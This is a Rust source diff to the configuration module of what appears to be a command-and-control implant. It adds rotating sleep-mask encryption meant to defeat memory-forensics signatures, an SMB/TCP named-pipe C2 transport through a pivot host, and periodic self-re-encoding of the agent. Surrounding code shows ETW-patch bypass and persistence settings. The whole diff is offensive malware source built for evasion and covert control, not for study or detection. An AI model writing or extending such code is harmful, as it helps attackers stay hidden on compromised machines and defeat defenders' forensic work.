@@ -57,6 +57,65 @@ pub enum SleepMethod {
     Standard,
 }
 
+/// Encryption scheme used for sleep-mask in-memory encryption.
+///
+/// Rotation between schemes defeats forensic signatures that target a
+/// specific ciphertext structure (e.g. XChaCha20-Poly1305's 24-byte nonce
+/// + 16-byte tag pattern).
+#[derive(
+    serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default,
+)]
+#[serde(rename_all = "kebab-case")]
+pub enum SleepScheme {
+    /// XChaCha20-Poly1305 AEAD (24-byte nonce, 16-byte tag). Default.
+    #[default]
+    XChaCha20Poly1305,
+    /// AES-256-GCM AEAD (12-byte nonce, 16-byte tag).
+    Aes256Gcm,
+    /// ChaCha20 stream cipher (12-byte nonce, no authentication tag).
+    /// Offers the highest throughput but provides **no integrity check** —
+    /// tampered regions will silently decrypt to garbage rather than fail.
+    ChaCha20,
+}
+
+impl SleepScheme {
+    /// Parse a scheme name from its config/toml string representation.
+    ///
+    /// Accepts both kebab-case (`"xchacha20-poly1305"`) and the enum's
+    /// `serde(rename_all = "kebab-case")` output.
+    pub fn from_config_str(s: &str) -> Option<Self> {
+        match s.to_ascii_lowercase().as_str() {
+            "xchacha20-poly1305" | "xchacha20poly1305" => Some(Self::XChaCha20Poly1305),
+            "aes-256-gcm" | "aes256gcm" => Some(Self::Aes256Gcm),
+            "chacha20" => Some(Self::ChaCha20),
+            _ => None,
+        }
+    }
+
+    /// Nonce length in bytes required by this scheme.
+    pub const fn nonce_len(&self) -> usize {
+        match self {
+            Self::XChaCha20Poly1305 => 24,
+            Self::Aes256Gcm => 12,
+            Self::ChaCha20 => 12,
+        }
+    }
+
+    /// Authentication tag length in bytes.  `0` for unauthenticated schemes.
+    pub const fn tag_len(&self) -> usize {
+        match self {
+            Self::XChaCha20Poly1305 => 16,
+            Self::Aes256Gcm => 16,
+            Self::ChaCha20 => 0,
+        }
+    }
+
+    /// Whether this scheme provides AEAD authentication.
+    pub const fn is_authenticated(&self) -> bool {
+        self.tag_len() > 0
+    }
+}
+
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
 #[serde(rename_all = "kebab-case")]
 pub struct SleepConfig {
@@ -80,6 +139,62 @@ pub struct SleepConfig {
     /// the current timing-based obfuscated sleep behaviour is preserved.
     #[serde(default)]
     pub sleep_mask_enabled: bool,
+    /// Interval in **seconds** between sleep-mask key rotations while the
+    /// agent is idle.  Every N seconds the guarded regions are re-encrypted
+    /// with a fresh XChaCha20-Poly1305 key so that a long-lived sleep window
+    /// does not present a static ciphertext pattern to memory forensics.
+    /// A value of `0` (the default) disables in-sleep rotation — the key
+    /// generated at `lock()` time is kept for the entire sleep duration.
+    /// Recommended production value: 300–600 seconds (5–10 minutes).
+    #[serde(default)]
+    pub mask_rotation_interval_secs: u64,
+    /// Ordered list of encryption schemes to cycle through during sleep-mask
+    /// key rotation.  Each rotation event advances to the next scheme in
+    /// the list (wrapping around).  When empty or containing only a single
+    /// entry, the behaviour is identical to the legacy single-scheme mode.
+    ///
+    /// Accepted values: `"xchaCha20-poly1305"`, `"aes-256-gcm"`, `"chacha20"`.
+    ///
+    /// # Backward compatibility
+    ///
+    /// If this field is omitted or empty, the agent uses
+    /// `[XChaCha20Poly1305]` — identical to the pre-rotation behaviour.
+    #[serde(default)]
+    pub mask_rotation_schemes: Vec<String>,
+}
+
+impl SleepConfig {
+    /// Resolve `mask_rotation_schemes` into a `Vec<SleepScheme>`.
+    ///
+    /// - If the list is empty, returns `[XChaCha20Poly1305]` (backward compat).
+    /// - Unrecognised strings are logged and skipped.
+    /// - If **no** entries parse successfully, falls back to
+    ///   `[XChaCha20Poly1305]`.
+    pub fn resolved_schemes(&self) -> Vec<SleepScheme> {
+        if self.mask_rotation_schemes.is_empty() {
+            return vec![SleepScheme::XChaCha20Poly1305];
+        }
+        let parsed: Vec<SleepScheme> = self
+            .mask_rotation_schemes
+            .iter()
+            .filter_map(|s| {
+                let scheme = SleepScheme::from_config_str(s);
+                if scheme.is_none() {
+                    log::warn!(
+                        "sleep-mask: ignoring unrecognised scheme '{}' in \
+                         mask_rotation_schemes",
+                        s
+                    );
+                }
+                scheme
+            })
+            .collect();
+        if parsed.is_empty() {
+            vec![SleepScheme::XChaCha20Poly1305]
+        } else {
+            parsed
+        }
+    }
 }
 
 fn default_base_interval() -> u64 {
@@ -99,6 +214,8 @@ impl Default for SleepConfig {
             working_hours_end: None,
             off_hours_multiplier: None,
             sleep_mask_enabled: false,
+            mask_rotation_interval_secs: 0,
+            mask_rotation_schemes: Vec::new(),
         }
     }
 }
@@ -209,6 +326,26 @@ pub struct MalleableProfile {
     /// * `never`  — never apply this bypass.
     #[serde(default)]
     pub etw_patch_mode: EtwPatchMode,
+    /// Enable the SMB/TCP named-pipe C2 transport.  When `true` the agent
+    /// attempts to connect via a Windows named pipe before falling through
+    /// to DoH / HTTP / direct TLS.  Windows-only; ignored on other platforms.
+    #[serde(default)]
+    pub smb_pipe_enabled: bool,
+    /// Target host for the named-pipe transport (e.g. `"10.0.0.5"`).
+    /// Required when `smb_pipe_enabled = true`.
+    #[serde(default)]
+    pub smb_pipe_host: Option<String>,
+    /// Pipe name on the target host.  Defaults to `"orchestra"`.
+    #[serde(default)]
+    pub smb_pipe_name: Option<String>,
+    /// Operating mode: `"smb"` connects directly to `\\host\pipe\name`
+    /// over SMB; `"tcp_relay"` connects to a local TCP port that a relay
+    /// on the pivot host forwards to the named pipe.
+    #[serde(default)]
+    pub smb_pipe_mode: Option<String>,
+    /// TCP port for the local relay in `tcp_relay` mode.  Defaults to 4455.
+    #[serde(default)]
+    pub smb_tcp_relay_port: Option<u16>,
 }
 
 /// Authentication method for the SSH covert transport.
@@ -260,7 +397,14 @@ impl Default for MalleableProfile {
             ssh_port: None,
             ssh_username: None,
             ssh_auth: None,
-            ssh_host_key_fingerprint: None,            etw_patch_mode: EtwPatchMode::default(),        }
+            ssh_host_key_fingerprint: None,
+            etw_patch_mode: EtwPatchMode::default(),
+            smb_pipe_enabled: false,
+            smb_pipe_host: None,
+            smb_pipe_name: None,
+            smb_pipe_mode: None,
+            smb_tcp_relay_port: None,
+        }
     }
 }
 
@@ -344,6 +488,11 @@ pub struct Config {
     /// hardware-breakpoint VEH approach instead.
     #[serde(default)]
     pub etw_patch_method: Option<EtwPatchMethod>,
+    /// Interval in seconds between periodic self-re-encoding passes.  Only
+    /// effective when the agent is compiled with the `self-reencode` feature.
+    /// Default: 14 400 s (4 hours).
+    #[serde(default = "default_reencode_interval")]
+    pub reencode_interval_secs: u64,
 }
 
 /// Per-platform list of persistence mechanisms to install.
@@ -452,6 +601,10 @@ fn default_module_repo() -> String {
     "https://updates.example.com/modules".into()
 }
 
+fn default_reencode_interval() -> u64 {
+    14_400 // 4 hours
+}
+
 pub fn default_module_cache_dir() -> String {
     if cfg!(windows) {
         let base = std::env::var_os("LOCALAPPDATA")
@@ -518,6 +671,7 @@ impl Default for Config {
             exec_strategy: ExecStrategy::Indirect,
             persistence: PersistenceConfig::default(),
             etw_patch_method: None,
+            reencode_interval_secs: default_reencode_interval(),
         }
     }
 }
